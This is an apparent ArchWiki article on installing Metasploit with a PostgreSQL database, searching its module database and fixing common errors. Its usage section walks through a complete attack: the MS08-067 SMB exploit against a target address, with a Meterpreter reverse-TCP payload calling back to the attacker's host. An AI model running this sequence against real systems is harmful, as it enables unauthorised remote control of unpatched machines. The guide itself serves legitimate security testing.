From [the official site](http://www.offensive-security.com/metasploit-unleashed/Introduction):

	Consider the MSF to be one of the single most useful auditing tools freely available to security professionals today. From a wide array of commercial grade exploits and an extensive exploit development environment, all the way to network information gathering tools and web vulnerability plugins. The Metasploit Framework provides a truly impressive work environment. The MSF is far more than just a collection of exploits, it's an infrastructure that you can build upon and utilize for your custom needs. This allows you to concentrate on your unique environment, and not have to reinvent the wheel.

Currently, Metasploit requires to setup and configure [PostgreSQL](/index.php/PostgreSQL "PostgreSQL") on target system to work. This wiki will show how to get Metasploit working with a PostgreSQL database.

## Contents

*   [1 Installation](#Installation)
    *   [1.1 Armitage](#Armitage)
    *   [1.2 RVM](#RVM)
*   [2 Setting up the database](#Setting_up_the_database)
*   [3 Usage](#Usage)
    *   [3.1 Module types](#Module_types)
    *   [3.2 Searching for exploits](#Searching_for_exploits)
    *   [3.3 Using an exploit](#Using_an_exploit)
*   [4 Tips and tricks](#Tips_and_tricks)
    *   [4.1 Searching from the database](#Searching_from_the_database)
    *   [4.2 Database search examples](#Database_search_examples)
    *   [4.3 Popularity of a platform by number of exploits](#Popularity_of_a_platform_by_number_of_exploits)
    *   [4.4 Disable the ASCII banner on startup](#Disable_the_ASCII_banner_on_startup)
    *   [4.5 Preserve variable values between sessions](#Preserve_variable_values_between_sessions)
*   [5 Troubleshooting](#Troubleshooting)
    *   [5.1 Cannot click in VNC viewer](#Cannot_click_in_VNC_viewer)
    *   [5.2 cannot load such file -- robots (LoadError)](#cannot_load_such_file_--_robots_(LoadError))
    *   [5.3 db_connect fails silently](#db_connect_fails_silently)
*   [6 See also](#See_also)

## Installation

Install package [metasploit](https://www.archlinux.org/packages/?name=metasploit). It is optional to follow the RVM setup instructions below. For latest development version, install [metasploit-git](https://aur.archlinux.org/packages/metasploit-git/) instead.

### Armitage

[Armitage](http://www.fastandeasyhacking.com/) is a GUI front end for Metasploit written in Java; it can be installed with the [armitage](https://aur.archlinux.org/packages/armitage/) package.

When running Armitage, [#Setting up the database](#Setting_up_the_database) is not optional, and must be followed. It is also mandatory to use a `~/.msf4/database.yml` file.

A sample `database.yml` file is packaged with Armitage as `/usr/share/metasploit/database.yml.sample`.

### RVM

Msfconsole requires [Ruby](/index.php/Ruby "Ruby") and some [Ruby#RubyGems](/index.php/Ruby#RubyGems "Ruby") to run without error.

Follow the [RVM#Installing RVM](/index.php/RVM#Installing_RVM "RVM") and [RVM#Using RVM](/index.php/RVM#Using_RVM "RVM") articles to install and use Ruby version 2.5.1 (see [Metasploit Git Repo](https://github.com/rapid7/metasploit-framework/blob/master/.ruby-version)) and set it to default.

Once complete, source the newly created RVM installation:

```
$ source ~/.rvm/scripts/rvm

```

and install all gems necessary to run Msfconsole using [Ruby#Bundler](/index.php/Ruby#Bundler "Ruby"):

```
$ gem install bundler

```

```
$ bundle install

```

**Note:** Using a version of Ruby older than 2.3.1 will result in the failure to install the `metasploit-concern` gem.

## Setting up the database

**Note:** Commands which must be run from `msfconsole` will be prefixed with `msf >` in this article.

Metasploit can be used without a database, but cache operations like searching would be very slow. This section shows how to set up Metasploit with *Postgresql* database server.

**Note:** If you are using the [#Armitage](#Armitage) front-end, the database is mandatory.

Follow the [PostgreSQL](/index.php/PostgreSQL "PostgreSQL") article and create a new database called `msf`. Any database name can be used, but this article will follow `msf`.

Start `msfconsole` and type:

```
msf > db_connect *user*@msf

```

where *user* is the database owner's name (usually your linux user's name).

Rebuild the database cache:

```
msf > db_rebuild_cache

```

Metasploit will rebuild the cache in the background, and you can continue running commands meanwhile.

**Tip:** It might take a few minutes to rebuild the cache the first time. Run `top` or [htop](https://www.archlinux.org/packages/?name=htop) to monitor the status of cache building. During the process, Ruby/Postgres/Metasploit processes will eat up 50% of CPU time.

Currently Metasploit requires running the `db_connect` command every time `msfconsole` is started. To avoid typing that command every time, simply put this alias in your shell startup file, for example `~/.bashrc`:

```
alias msfconsole="msfconsole --quiet -x \"db_connect ${USER}@msf\""

```

where the `quiet` option will [#Disable the ASCII banner on startup](#Disable_the_ASCII_banner_on_startup), and the `-x` command runs the given command right after startup.

Another workaround for this is to create a `database.yml` file in the `.msf4` directory. For example:

 `~/.msf4/database.yml` 
```
production:
 adapter: postgresql
 database: msf
 username: ${USER}
 password: ${PASS}
 host: localhost
 port: 5432
 pool: 5
 timeout: 5

```

**Note:** The database cache needs to be built only once. Later on upon startup, `msfconsole` will say `[*] Rebuilding the module cache in the background...`, but it will actually only update the changes. If no changes are made to the database, it will take only half a second.

Run `db_status` to verify that database connection is properly established:

 `msf > db_status` 
```
[*] postgresql connected to msf

```

## Usage

There are several interfaces available for Metasploit. This section will explain how to use `msfconsole`, the interface that provides the most features available in MSF.

To start it, simply type `msfconsole`. The prompt will change to `msf >` to indicate it is waiting for commands.

**Tip:** Besides additional Metasploit commands explained below, all the regular shell commands and scripts found in `$PATH` are available too! (except for aliases)

### Module types

Everything (scripts, files, programs etc) in Metasploit is a module. There are 6 types of modules:

*   `auxiliary` - Modules for helping the attacker in various tasks, like [port scanning](/index.php/Nmap "Nmap"), version detection or network traffic analysis
*   `exploit` - The code that takes advantage of a vulnerability and allows the execution of the payload, like triggering buffer overflow or bypassing authentication
*   `payload` - The thing that has to be done right after a successful exploit, like establishing a remote connection, starting a meterpreter session or executing some shell commands
*   `post` - Various programs that can be run after successful exploitation and remote connection, like collecting passwords, setting up keyloggers or downloading files
*   `encoder` - Programs for performing encryption
*   `nop` - *NOP* generators. *NOP* is an assembly language instruction which simply does nothing. The machine code of this instruction is different on each hardware architecture. *NOP* instructions are useful for filling the void in executables.

### Searching for exploits

To discover what operating system and software version a target runs, perform a [port scan](/index.php/Nmap "Nmap"). With this information, use the `search` command to search for available exploits.

To search for all exploits targeting Novell on the Linux platform:

```
msf > search platform:linux type:exploit name:Novell

```

To search for all exploits on the Linux platform containing the keyword Apache and filter the results with *grep*:

```
msf > grep RCE search platform:linux type:exploit Apache

```

To search for specific field, type its name, followed by column and the phrase. The following search fields are available:

| Search field | Matches | Possible values | DB table & column |
| `app` | Passive (client) or Active (server) exploits | `client`, `server` | `module_details.stance` |
| `author` | Name and email of module Author | Any phrase | `module_authors.name` |
| `type` | The [module type](#Module_types) | `auxiliary`, `exploit`, `payload`, `post`, `encoder`, `nop` | `module_details.mtype` |
| `name` | The path (Name) and the short description | Any phrase | `module_details.fullname`, `module_details.name` |
| `platform` | The target hardware or software platform | `bsdi`, `netware`, `linux`, `hpux`, `irix`, `osx`, `bsd`, `platform`, `java`, `javascript`, `unix`, `php`, `firefox`, `nodejs`, `ruby`, `cisco`, `android`, `aix`, `windows`, `python`, `solaris` | `module_platforms.name` |
| `bid`, `cve`, `edb`, `osvdb` or `ref` | The [Bugtraq](http://www.securityfocus.com/), [CVE](http://www.cvedetails.com/), [Exploit-DB](http://www.exploit-db.com/), [OSBDB](http://www.osvdb.org/) ID or any | Exploit database entry ID, or a part of upstream report URL | `module_refs.name` |
| (No field) | All of the above except `app` and `type` | Any phrase | All of the above |

See [#Searching from the database](#Searching_from_the_database) and [#Database search examples](#Database_search_examples) for more advanced search queries.

### Using an exploit

After choosing an appropriate exploit, it is time to start hacking!

First, select an exploit using the `use` command:

```
msf > use exploit/windows/smb/ms08_067_netapi

```

**Note:** `ms08_067_netapi` is one of the most popular exploits affecting Windows XP and Windows Server 2003 SMB services. It was disclosed in 2008 and proves to be very reliable in exploiting unpatched systems which have firewalls disabled.

To view information about a module, use the `info` command:

```
msf exploit(ms08_067_netapi) > info exploit/windows/smb/ms08_067_netapi

```

Running `info` without arguments will show info about currently selected module.

To view the selected exploit's options, run:

 `msf exploit(ms08_067_netapi) > show options` 
```
Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

   ...

```

All the required fields must be provided before exploitation. Here, only the `RHOST` variable must be specified. To assign a value to a variable use the `set` command:

```
msf exploit(ms08_067_netapi) > set RHOST 192.168.56.102

```

Now choose the payload:

```
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp

```

**Note:** Meterpreter is a command shell built into Metasploit and allows the attacker to run remote commands on exploited systems. Reverse TCP is technique when the exploited computer establishes a connection back to the computer it was exploited from.

Choosing a payload (actually, choosing modules in general) will add more options. Run `show options` again:

 `msf exploit(ms08_067_netapi) > show options` 
```
Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.56.102   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

```

Now assign `LHOST` variable to the address of your computer, where the exploited computer will send connection requests to:

```
msf exploit(ms08_067_netapi) > set LHOST 192.168.56.1

```

Now launch the attack!

```
msf exploit(ms08_067_netapi) > exploit

```

If you are lucky, you will be dropped to a Meterpreter session where you can do anything on the remote computer.

## Tips and tricks

### Searching from the database

Since everything in Metasploit is stored in a database, it is easy to make powerful search queries without the need of the `search` frontend command.

To start the database interface, run:

```
$ psql msf

```

The information about modules is stored in 8 tables:

| Table Name | Contents |
| `module_details` | The "main" table, describes various details of each module |
| `module_actions` | The action names of *auxiliary* modules |
| `module_archs` | The target hardware architecture or software platform |
| `module_authors` | Names and emails of module author |
| `module_mixins` | Empty (???) |
| `module_platforms` | The target operating system. See also [#Popularity of a platform by number of exploits](#Popularity_of_a_platform_by_number_of_exploits) |
| `module_refs` | References to various online exploit databases and reports |
| `module_targets` | The target program name and version of the *exploit* |

**Tip:** To see what type of details (columns) a table contains, run `\d+ *table_name*`. For example: `\d+ module_details`.

Almost all tables have 3 columns: `id`, `detail_id` and `name`, except for `module_details` table which has 16 columns.

The `detail_id` values are pointers to the rows of `module_details` table.

To see the all the contents of a table, run:

```
SELECT * FROM *table_name*;

```

Multiple:

*   Architecture
*   Platform
*   Target

Module options:

*   module type
*   stance
*   privileged
*   path
*   name
*   refname
*   rank
*   privileged
*   disclosure date

### Database search examples

The `module_details` table contains multiple columns and viewing them all at once is not convenient. To show only basic information about the modules:

```
SELECT id, mtype, refname, disclosure_date, rank, stance, name
FROM module_details;

```

Show some information about available modules, include platform information from `module_platforms`:

```
SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id;

```

Show all client (aggressive) exploits for Windows platform:

```
SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id
WHERE module_platforms.name = 'windows'
AND mtype = 'exploit'
AND stance = 'aggressive';

```

Show all exploits for Windows platform with rank >= 500 disclosed after 2013:

```
SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id
WHERE module_platforms.name = 'windows'
AND mtype = 'exploit'
AND rank >= 500
AND disclosure_date >= TIMESTAMP '2013-1-1';

```

Show all aggressive (client) exploits for Windows platform with rank >= 500 and include additional information about module's target:

```
SELECT module_details.id, mtype, module_platforms.name as platform, module_details.name, DATE(disclosure_date), rank, module_targets.name as target
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id JOIN module_targets on module_details.id = module_targets.detail_id
WHERE module_platforms.name = 'windows'
AND mtype = 'exploit'
AND stance = 'aggressive'
AND rank >= 500
order by target;

```

### Popularity of a platform by number of exploits

To view the possible `platform` values, and number of available exploits, run from `psql`:

```
SELECT name, count(*)
FROM module_platforms
GROUP BY name
ORDER BY count DESC;

```

### Disable the ASCII banner on startup

To disable the banner, run `msfconsole` with `-q`/`--quiet` argument:

```
$ msfconsole --quiet

```

### Preserve variable values between sessions

If you do not want the variables to reset when selecting another module and when rerunning `msfconsole` then set it globally via `setg`, for example:

```
msf > setg RHOST 192.168.56.102

```

## Troubleshooting

### Cannot click in VNC viewer

If you selected VNC viewer as a payload, but are unable to click or do any actions, that means you forgot to set the `ViewOnly` variable to false. To fix this problem, re-run the exploit with the variable set to `false`:

```
msf > set ViewOnly false

```

### cannot load such file -- robots (LoadError)

If you get an error like this:

```
~/metasploit-framework/lib/metasploit/framework.rb:19:in `require': cannot load such file -- robots (LoadError)
    from ~/metasploit-framework/lib/metasploit/framework.rb:19:in `<top (required)>'
    from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `require'
    from ~/metasploit-framework/lib/metasploit/framework/database.rb:1:in `<top (required)>'
    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `require'
    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/base.rb:17:in `<top (required)>'
    from ~/metasploit-framework/lib/metasploit/framework/parsed_options/console.rb:2:in `<top (required)>'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `const_get'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:230:in `block in constantize'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `each'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/inflector/methods.rb:229:in `constantize'
    from /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/activesupport-3.2.19/lib/active_support/core_ext/string/inflections.rb:54:in `constantize'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:73:in `parsed_options_class'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:69:in `parsed_options'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:47:in `require_environment!'
    from ~/metasploit-framework/lib/metasploit/framework/command/base.rb:81:in `start'
    from ./msfconsole:48:in `<main>'

```

This happens because the file `robots.rb` has incorrect permissions and can be read only by the root user (see [the bug report](https://github.com/fizx/robots/issues/6)):

 `$ ls -l /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/robots-0.10.1/lib` 
```
total 4
-rw-r----- 1 root root 3174 Oct 19 16:47 robots.rb

```

To fix this, simply change the permission to be world-readable:

```
# chmod o+r /opt/ruby1.9/lib/ruby/gems/1.9.1/gems/robots-0.10.1/lib/robots.rb

```

### db_connect fails silently

If upon running `db_connect` you see no output, but later getting a message like this:

```
[!] Database not connected or cache not built, using slow search

```

that probably means that the `postgresql` service is not running.

## See also

*   [Metasploit Unleashed security training](http://www.offensive-security.com/metasploit-unleashed/Main_Page)
*   [GitHub wiki](https://github.com/rapid7/metasploit-framework/wiki)
*   [Wikibooks](https://en.wikibooks.org/wiki/Metasploit "wikibooks:Metasploit")
*   [Wikipedia](https://en.wikipedia.org/wiki/Metasploit_Project "wikipedia:Metasploit Project")